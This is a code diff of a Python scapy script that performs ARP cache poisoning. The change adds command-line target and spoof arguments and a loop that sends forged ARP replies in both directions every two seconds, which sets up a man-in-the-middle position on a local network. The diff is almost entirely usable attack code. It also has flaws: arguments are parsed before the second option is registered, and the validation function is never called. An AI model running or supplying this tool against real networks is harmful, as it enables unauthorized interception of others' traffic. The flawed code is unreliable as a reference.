@@ -2,14 +2,16 @@
 
 import scapy.all as scapy
 import argparse
+import time
 
 def main():
-    tar_IP = "10.0.2.7"
-    spoofIP = "10.0.2.1"
-
-    packet = create_packet(tar_IP, spoofIP)
-
-    scapy.send(packet)
+    tar_IP, spoofIP = get_arguments()
+    packet1 = create_packet(tar_IP, spoofIP)
+    packet2 = create_packet(spoofIP, tar_IP)
+    while True:
+        scapy.send(packet1)
+        scapy.send(packet2)
+        time.sleep(2)
 
 
 def create_packet(tar_IP, spoofIP):
@@ -37,6 +39,25 @@ def get_mac(ip):
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     
     return answered_list[0][1].hwsrc
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-t', '--targetIP', dest='targetIP', help="IP that user wishes to trick.")
+    options = parser.parse_args()
+    parser.add_argument('-s', '--spoofIP', dest='spoofIP', help="IP that user wants the target to reassociate the MAC for.")
+    options = parser.parse_args()
+
+    return options.targetIP, options.spoofIP
+
+
+def check_args(targetIP, spoofIP):
+    if targetIP == None:
+        print('Please input a target to trick using the "-t" command.\n(Use --help for help)')
+        exit()
+    if spoofIP == None:
+        print('Please input an IP you want the target to associate you as using the "-s" command.\n(Use --help for help)')
+        exit()
 
 
 if __name__ == '__main__':
